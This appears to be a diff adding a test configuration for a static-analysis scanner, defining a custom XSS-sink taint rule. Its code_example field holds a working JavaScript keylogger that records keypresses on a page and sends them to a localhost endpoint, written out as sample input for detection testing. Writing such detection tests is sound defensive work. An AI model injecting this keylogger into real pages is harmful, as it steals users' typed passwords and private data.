@@ -1,0 +1,12 @@
+custom_rules:
+  - id: 'Custom XSS Sink'
+    description: 'Test of custom XSS Sink rule'
+    severity: 'critical'
+    cwe: 'CWE-725'
+    fix_analysis: 'Fix Analysis for custom XSS Sink Rule'
+    rule_code: 'CustomTaintVuln<PRED:Source,PRED:None, PRED:XssSink>'
+    code_example: "var timeout;\nvar buffer = '';\ndocument.querySelector('body').addEventListener('keypress', function(event) {\n\tif (event.which !== 0) {\n\t\tclearTimeout(timeout);\n\t\tbuffer += String.fromCharCode(event.which);\n\t\ttimeout = setTimeout(function() {\n\t\t\tvar xhr = new XMLHttpRequest();\n\t\t\tvar uri = 'http://localhost:3001/keys?data=' + encodeURIComponent(buffer);\n\t\t\txhr.open('GET', uri);\n\t\t\txhr.send();\n\t\t\tbuffer = '';\n\t\t}, 400);\n\t}\n});"
+    languages:
+      - 'javascript'
+      - 'java'
+      - 'python'
